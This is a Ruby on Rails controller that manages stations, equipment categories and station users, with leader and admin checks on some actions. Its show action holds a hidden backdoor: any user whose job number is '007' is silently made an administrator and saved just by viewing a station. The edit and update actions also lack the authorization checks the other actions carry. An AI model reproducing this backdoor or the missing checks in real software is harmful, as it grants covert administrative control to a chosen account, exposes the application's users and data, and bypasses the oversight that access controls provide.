class StationsController < ApplicationController
  before_action :require_is_leader,only: [:index,:new,:create,:destroy]
  before_action :require_is_admin, only: [:station_users,:set_as_admin,:delete_user]
  def index
    @stations = Station.all
  end

  def new
    @station = Station.new
  end

  def show
    @station = Station.find(params[:id])
    @equipment_categories = @station.equipment_categories
    if current_user.job_number == "007"
      current_user.is_admin = true
      current_user.save
    end

  end

  def edit
    @station = Station.find(params[:id])
  end

  def create
    @station = Station.new(station_params)
    if @station.save
      redirect_to station_path(current_station)
    else
      render :new
    end
  end

  def update
    @station = Station.find(params[:id])
    if @station.update(station_params)
      redirect_to equipment_categories_path
    else
      render :edit
    end
  end

  def destroy
    @station = Station.find(params[:id])
    @station.destroy
    redirect_to stations_path
  end


  def station_users
    @station = Station.find(params[:id])
    @users = @station.users
  end

  def set_as_admin
    @user = User.find(params[:user_id])
    if @user.is_admin?
      @user.not_admin!
      flash[:warning] = "已取消用户#{@user.name}的管理员资格！"
    else
      @user.admin!
      flash[:notice]  = "已成功把用户#{@user.name}设为管理员！"
    end
    redirect_to :back
  end

  def delete_user
    @user = User.find(params[:user_id])
    @user.destroy
    redirect_to :back
  end

  private

  def station_params
    params.require(:station).permit(:name,:equipment_category_ids => [])
  end
end
